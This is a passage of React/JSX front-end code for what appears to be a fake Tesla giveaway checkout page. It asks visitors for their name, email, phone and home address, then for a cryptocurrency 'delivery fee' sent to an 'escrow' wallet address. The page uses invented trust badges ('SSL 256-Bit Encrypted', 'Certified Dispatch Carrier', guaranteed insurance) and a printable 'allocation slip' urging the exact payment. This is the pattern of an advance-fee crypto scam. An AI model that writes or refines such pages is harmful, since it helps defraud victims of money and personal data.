                        setSelectedDropId(e.target.value);
                      }}
                      className="w-full h-10 rounded-lg border border-input bg-background px-3 text-xs font-bold text-foreground outline-none focus:ring-2 focus:ring-foreground"
                    >
                      {drops.map((d) => (
                        <option key={d.id} value={d.id}>
                          {d.name} — {d.kind === "giveaway" ? "Free Giveaway" : formatDisplayPrice(d.amount)} ({formatFeeDisplay(d.delivery_fee)} delivery)
                        </option>
                      ))}
                    </select>
                  </div>

                  {/* Guaranteed Protection Badge */}
                  <div className="flex items-start gap-2.5 rounded-lg border border-emerald-500/30 bg-emerald-500/5 p-3 text-[11px] text-emerald-800 dark:text-emerald-300">
                    <ShieldCheck size={18} className="shrink-0 mt-0.5 text-emerald-600" />
                    <span>
                      <strong>Guaranteed White-Glove Transport:</strong> Full vehicle inspection, enclosed car carrier transport, and comprehensive cargo insurance included.
                    </span>
                  </div>
                </div>
              </div>
            </aside>

            {/* Right Column: Checkout & Registration Form */}
            <section className="lg:col-span-7">
              <form onSubmit={handleSubmitOrder} className="rounded-2xl border border-border bg-card p-6 sm:p-8 shadow-lg space-y-7">
                <div>
                  <span className="text-xs font-black uppercase tracking-wider text-muted-foreground">
                    Step 1 of 2
                  </span>
                  <h1 className="font-serif text-2xl sm:text-3xl font-bold text-foreground mt-1">
                    Recipient & Delivery Details
                  </h1>
                  <p className="text-xs text-muted-foreground mt-1">
                    Provide the recipient registration name and shipping address for vehicle delivery.
                  </p>
                </div>

                {/* Recipient Details */}
                <div className="space-y-4">
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <div className="space-y-1.5">
                      <label className="text-xs font-bold text-foreground">
                        Full Legal Name <span className="text-destructive">*</span>
                      </label>
                      <Input
                        required
                        placeholder="e.g. John Doe"
                        value={fullName}
                        onChange={(e) => setFullName(e.target.value)}
                        className="h-11 text-sm bg-background"
                      />
                    </div>

                    <div className="space-y-1.5">
                      <label className="text-xs font-bold text-foreground">
                        Email Address (for VIN & Carrier Tracking) <span className="text-destructive">*</span>
                      </label>
                      <Input
                        required
                        type="email"
                        placeholder="you@example.com"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        className="h-11 text-sm bg-background"
                      />
                    </div>
                  </div>

                  <div className="space-y-1.5">
                    <label className="text-xs font-bold text-foreground">
                      Contact Phone (Carrier Delivery Updates)
                    </label>
                    <Input
                      type="tel"
                      placeholder="+1 (555) 000-0000"
                      value={phone}
                      onChange={(e) => setPhone(e.target.value)}
                      className="h-11 text-sm bg-background"
                    />
                  </div>
                </div>

                {/* Delivery Address */}
                <div className="space-y-4 border-t border-border pt-6">
                  <div>
                    <h2 className="text-sm font-bold text-foreground">
                      Destination Address
                    </h2>
                    <p className="text-[11px] text-muted-foreground">
                      Vehicle will be dispatched via enclosed carrier directly to this driveway or facility.
                    </p>
                  </div>

                  <div className="space-y-1.5">
                    <label className="text-xs font-bold text-foreground">
                      Street Address <span className="text-destructive">*</span>
                    </label>
                    <Input
                      required
                      placeholder="1234 Electric Avenue"
                      value={street}
                      onChange={(e) => setStreet(e.target.value)}
                      className="h-11 text-sm bg-background"
                    />
                  </div>

                  <div className="space-y-1.5">
                    <label className="text-xs font-bold text-foreground">
                      Apartment, Suite, Unit, or Gate Code (optional)
                    </label>
                    <Input
                      placeholder="Apt 4B or Gate #12"
                      value={apartment}
                      onChange={(e) => setApartment(e.target.value)}
                      className="h-11 text-sm bg-background"
                    />
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                    <div className="space-y-1.5">
                      <label className="text-xs font-bold text-foreground">
                        City <span className="text-destructive">*</span>
                      </label>
                      <Input
                        required
                        placeholder="City"
                        value={city}
                        onChange={(e) => setCity(e.target.value)}
                        className="h-11 text-sm bg-background"
                      />
                    </div>

                    <div className="space-y-1.5">
                      <label className="text-xs font-bold text-foreground">
                        State / Province <span className="text-destructive">*</span>
                      </label>
                      <Input
                        required
                        placeholder="State"
                        value={stateProvince}
                        onChange={(e) => setStateProvince(e.target.value)}
                        className="h-11 text-sm bg-background"
                      />
                    </div>

                    <div className="space-y-1.5">
                      <label className="text-xs font-bold text-foreground">
                        Postal / ZIP Code <span className="text-destructive">*</span>
                      </label>
                      <Input
                        required
                        placeholder="ZIP"
                        value={postalCode}
                        onChange={(e) => setPostalCode(e.target.value)}
                        className="h-11 text-sm bg-background"
                      />
                    </div>
                  </div>

                  <div className="space-y-1.5">
                    <label className="text-xs font-bold text-foreground">
                      Country <span className="text-destructive">*</span>
                    </label>
                    <select
                      value={country}
                      onChange={(e) => setCountry(e.target.value)}
                      className="w-full h-11 rounded-md border border-input bg-background px-3 text-sm text-foreground outline-none focus:ring-2 focus:ring-foreground"
                    >
                      {COUNTRIES.map((c) => (
                        <option key={c} value={c}>
                          {c}
                        </option>
                      ))}
                    </select>
                  </div>
                </div>

                {/* Cryptocurrency Payment Method Selection with Live Crypto Rates */}
                <div className="space-y-4 border-t border-border pt-6">
                  <div className="flex items-center justify-between">
                    <div>
                      <h2 className="text-sm font-bold text-foreground">
                        Delivery Fee Cryptocurrency Method
                      </h2>
                      <p className="text-[11px] text-muted-foreground">
                        Select crypto payment method (live exchange conversion applied):
                      </p>
                    </div>
                    <div className="text-right">
                      <span className="font-mono text-xs font-bold bg-muted px-2.5 py-1 rounded-full block">
                        {formatFeeDisplay(currentDrop?.delivery_fee)}
                      </span>
                    </div>
                  </div>

                  {walletConfig && walletConfig.accepted_coins && (
                    <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5">
                      {walletConfig.accepted_coins.map((coin) => {
                        const coinCalc = calculateCryptoAmount(currentDrop?.delivery_fee, coin, cryptoRates);
                        return (
                          <button
                            key={coin}
                            type="button"
                            onClick={() => setCrypto(coin)}
                            className={`flex flex-col items-center justify-center gap-1 rounded-xl border p-2.5 text-xs font-bold transition-all cursor-pointer ${
                              crypto === coin
                                ? "border-foreground bg-foreground text-background shadow-sm"
                                : "border-border bg-background text-foreground hover:bg-muted"
                            }`}
                          >
                            <div className="flex items-center gap-1.5">
                              <CryptoIcon coin={coin} size={16} />
                              <span>{coin}</span>
                            </div>
                            <span
                              className={`text-[10px] font-mono ${
                                crypto === coin ? "text-background/80" : "text-muted-foreground"
                              }`}
                            >
                              {coinCalc.formatted}
                            </span>
                          </button>
                        );
                      })}
                    </div>
                  )}

                  {/* Immediate Wallet Address & QR Preview Box with Live Amount & 1-Click Launch */}
                  <div className="rounded-xl border border-border bg-muted/40 p-4 space-y-3">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-bold text-foreground">
                        Designated {crypto} Escrow Address
                      </span>
                      <button
                        type="button"
                        onClick={() => copyAddress()}
                        className="inline-flex items-center gap-1 text-[11px] font-bold text-foreground hover:underline cursor-pointer"
                      >
                        {copied ? <Check size={12} className="text-emerald-500" /> : <Copy size={12} />}
                        {copied ? "Copied!" : "Copy Address"}
                      </button>
                    </div>

                    <div className="flex flex-col sm:flex-row items-center gap-4">
                      <div className="flex flex-col items-center justify-center p-2 rounded-lg bg-white border border-border shrink-0 shadow-2xs">
                        {activeQrImage ? (
                          <img src={activeQrImage} alt="Payment QR code" className="h-24 w-24 object-contain" />
                        ) : (
                          <QrCode value={activeWalletAddress} size={96} />
                        )}
                      </div>
                      <div className="space-y-2 flex-1 min-w-0 w-full">
                        <Input
                          readOnly
                          value={activeWalletAddress}
                          className="font-mono text-xs bg-background h-10 select-all"
                        />
                        <div className="flex flex-wrap items-center gap-2">
                          <Button
                            type="button"
                            size="sm"
                            className="h-8 rounded-lg font-bold text-[11px] cursor-pointer"
                            onClick={() => openWalletApp(crypto, activeWalletAddress, currentCryptoCalc.cryptoValue)}
                          >
                            <ExternalLink size={12} className="mr-1" /> Open in {crypto} App
                          </Button>
                          <Button
                            type="button"
                            variant="outline"
                            size="sm"
                            className="h-8 rounded-lg font-bold text-[11px] cursor-pointer"
                            onClick={() => copyAmount(currentCryptoCalc.formatted)}
                          >
                            {copiedAmount ? <Check size={12} className="text-emerald-500 mr-1" /> : <Copy size={12} className="mr-1" />}
                            {copiedAmount ? "Amount Copied" : "Copy Amount"}
                          </Button>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Submit Action */}
                <div className="space-y-3 pt-3">
                  <Button
                    type="submit"
                    disabled={submitting}
                    className="w-full rounded-full font-bold text-sm h-12 shadow-lg cursor-pointer"
                  >
                    {submitting ? (
                      <>
                        <Loader2 size={16} className="animate-spin mr-2" />
                        Securing Tesla Allocation...
                      </>
                    ) : (
                      <>
                        {currentDrop?.kind === "giveaway"
                          ? `Confirm Claim & Reserve Spot · ${formatFeeDisplay(currentDrop?.delivery_fee)} (${currentCryptoCalc.formatted})`
                          : `Confirm Purchase & Reserve Spot · ${formatFeeDisplay(currentDrop?.delivery_fee)} (${currentCryptoCalc.formatted})`}
                        <ArrowRight size={16} className="ml-2" />
                      </>
                    )}
                  </Button>

                  <div className="flex items-center justify-center gap-4 text-[11px] text-muted-foreground pt-1">
                    <span className="inline-flex items-center gap-1">
                      <Lock size={12} /> SSL 256-Bit Encrypted
                    </span>
                    <span>•</span>
                    <span className="inline-flex items-center gap-1">
                      <ShieldCheck size={12} /> Certified Dispatch Carrier
                    </span>
                  </div>
                </div>
              </form>
            </section>
          </div>
        )}
      </main>

      {/* ── INTERACTIVE ALLOCATION SLIP MODAL (PRINT/SAVE) ──────── */}
      {showSlipModal && submittedOrder && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4 overflow-y-auto">
          <div className="relative w-full max-w-2xl bg-card border border-border rounded-2xl shadow-2xl p-6 sm:p-8 space-y-6 print-clean-slip">
            {/* Header with Insignia and Verification */}
            <div className="flex items-start justify-between border-b-2 border-border pb-5">
              <div>
                <span className="font-mono text-[10px] font-black tracking-widest text-emerald-600 dark:text-emerald-400 uppercase">
                  CERTIFIED DISPATCH ALLOCATION
                </span>
                <h2 className="font-serif text-2xl font-black uppercase tracking-tight text-foreground mt-0.5">
                  Tesla Allocation Slip
                </h2>
                <p className="text-xs text-muted-foreground">
                  Enclosed Carrier Transport Bill of Lading & Allocation Voucher
                </p>
              </div>
              <div className="text-right">
                <span className="text-[10px] font-bold text-muted-foreground uppercase">Allocation Ref</span>
                <p className="font-mono text-sm font-black text-foreground">#{submittedOrder.ref}</p>
                <span className="inline-flex items-center gap-1 text-[10px] text-emerald-500 font-bold">
                  <CheckCircle2 size={12} /> Priority Locked
                </span>
              </div>
            </div>

            {/* Grid of Allocation Details */}
            <div className="grid grid-cols-2 gap-4 text-xs">
              <div className="space-y-1">
                <span className="text-[10px] font-bold uppercase text-muted-foreground">Allocated Vehicle</span>
                <p className="font-bold text-sm text-foreground">{submittedOrder.drop.name}</p>
                <p className="text-[11px] text-muted-foreground">
                  Valuation: {formatDisplayPrice(submittedOrder.drop.prize_value)}
                </p>
              </div>

              <div className="space-y-1">
                <span className="text-[10px] font-bold uppercase text-muted-foreground">Carrier Transport Window</span>
                <p className="font-bold text-foreground">Priority Carrier Dispatch (48-72h)</p>
                <p className="text-[11px] text-emerald-600 dark:text-emerald-400 font-semibold">White-Glove Enclosed Carrier</p>
              </div>
            </div>

            {/* Recipient Logistics */}
            <div className="rounded-xl border border-border bg-muted/40 p-4 space-y-2 text-xs">
              <div className="flex justify-between border-b border-border/50 pb-1.5">
                <span className="text-muted-foreground">Registered Recipient:</span>
                <span className="font-bold text-foreground">{submittedOrder.fullName}</span>
              </div>
              <div className="flex justify-between border-b border-border/50 pb-1.5">
                <span className="text-muted-foreground">Registered Email:</span>
                <span className="font-bold text-foreground">{submittedOrder.email}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-muted-foreground">Delivery Destination:</span>
                <span className="font-bold text-foreground text-right max-w-xs">{submittedOrder.address}</span>
              </div>
            </div>

            {/* Payment Settlement Information with Live Crypto Equivalent */}
            <div className="rounded-xl border-2 border-dashed border-border p-4 flex flex-col sm:flex-row items-center gap-4 bg-background">
              <div className="p-2 rounded-lg bg-white border border-border shrink-0 shadow-2xs">
                {activeQrImage ? (
                  <img src={activeQrImage} alt="Payment QR" className="h-20 w-20 object-contain" />
                ) : (
                  <QrCode value={submittedOrder.walletAddress} size={80} />
                )}
              </div>
              <div className="flex-1 min-w-0 space-y-1 text-xs">
                <div className="flex items-center justify-between">
                  <span className="font-bold text-foreground">Delivery Processing Fee:</span>
                  <div className="text-right">
                    <span className="font-mono font-bold text-sm text-foreground block">
                      {formatFeeDisplay(submittedOrder.fee)}
                    </span>
                    {submittedCryptoCalc && (
                      <span className="font-mono text-[10px] text-emerald-600 dark:text-emerald-400 font-bold block">
                        ≈ {submittedCryptoCalc.formatted}
                      </span>
                    )}
                  </div>
                </div>
                <p className="text-[10px] text-muted-foreground">
                  Send exactly {submittedCryptoCalc ? submittedCryptoCalc.formatted : formatFeeDisplay(submittedOrder.fee)} in {submittedOrder.crypto} to lock carrier routing:
                </p>
                <p className="font-mono text-[10px] break-all bg-muted p-1.5 rounded text-foreground font-semibold">
                  {submittedOrder.walletAddress}
                </p>
              </div>
            </div>

            {/* Action Buttons (no-print) */}
            <div className="flex items-center justify-end gap-3 pt-3 border-t border-border no-print">
              <Button
                type="button"
                variant="outline"
                className="rounded-full font-bold text-xs h-10 px-5 cursor-pointer"
                onClick={() => setShowSlipModal(false)}
              >
                Close Slip
              </Button>
              <Button
                type="button"
                className="rounded-full font-bold text-xs h-10 px-6 shadow-md cursor-pointer"
                onClick={() => window.print()}
              >
                <Printer size={14} className="mr-1.5" /> Print or Save as PDF
              </Button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
